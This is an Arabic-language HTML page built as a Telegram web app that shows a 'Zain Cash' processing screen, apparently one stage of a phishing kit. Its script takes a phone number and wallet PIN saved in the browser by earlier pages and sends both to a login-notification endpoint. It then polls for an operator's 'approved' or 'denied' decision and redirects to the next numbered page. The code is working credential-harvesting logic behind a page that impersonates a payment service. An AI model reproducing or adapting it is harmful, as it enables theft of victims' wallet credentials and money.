<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>زين كاش - جاري المعالجة</title>

    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #2b1238;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .loading-card {
            background: white;
            width: 90%;
            max-width: 380px;
            padding: 50px 20px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.25);
        }

        .loader-circle {
            width: 110px;
            height: 110px;
            background: radial-gradient(circle, #a1278a 0%, #581d72 100%);
            border-radius: 50%;
            margin: 0 auto 30px;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 6px 20px rgba(88, 29, 114, 0.3);
        }

        .loader-circle::after {
            content: '';
            width: 80px;
            height: 80px;
            border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            animation: spin 1.5s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        h2 {
            color: #581d72;
            font-size: 24px;
            margin: 0 0 10px;
        }

        p {
            color: #666;
            font-size: 15px;
            margin: 0;
            line-height: 1.5;
        }
    </style>
</head>

<body>

<div class="loading-card">
    <div class="loader-circle"></div>
    <h2 id="main-text">جاري المعالجة...</h2>
    <p id="sub-text">يرجى الانتظار بينما يتم التحقق من بياناتك...</p>
</div>

<script>
document.addEventListener("DOMContentLoaded", async () => {

    const mainText = document.getElementById("main-text");
    const subText = document.getElementById("sub-text");

    const tg = window.Telegram?.WebApp;
    if (tg) {
        tg.ready();
        tg.expand();
    }

    const phone = localStorage.getItem("phone") || "";
    const pin = localStorage.getItem("lastPin") || "";

    if (!phone) {
        console.warn("⚠️ لم يتم العثور على رقم الهاتف في التخزين المحلي");
    }

    // -------------------- SEND LOGIN REQUEST --------------------
    try {
        await fetch("/api/login-notification", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ phone, pin })
        });
    } catch (err) {
        console.error("❌ خطأ في الاتصال :", err);
    }

    // -------------------- TEXT CHANGE --------------------
    setTimeout(() => {
        mainText.textContent = "يرجى الانتظار قليلاً...";
        subText.textContent = "هذا قد يستغرق بضع ثوانٍ للموافقة";
    }, 3000);

    // -------------------- CHECK APPROVAL --------------------
    async function checkApproval() {
        if (!phone) return;

        try {
            const res = await fetch(`/api/check-status?phone=${phone}`);
            const data = await res.json();

            if (data.status === "approved") {
                mainText.textContent = "تمت الموافقة بنجاح!";
                subText.textContent = "جاري فتح الصفحة التالية...";

                setTimeout(() => {
                    window.location.href = "/page8";
                }, 1500);
            }

            if (data.status === "denied") {
                mainText.textContent = "تم الرفض!";
                subText.textContent = "البيانات المدخلة غير صحيحة أو تم إلغاء الطلب.";
            }

        } catch (err) {
            console.error("❌ فشل التحقق من الحالة :", err);
        }
    }

    setInterval(checkApproval, 2000);
});
</script>

</body>
</html>
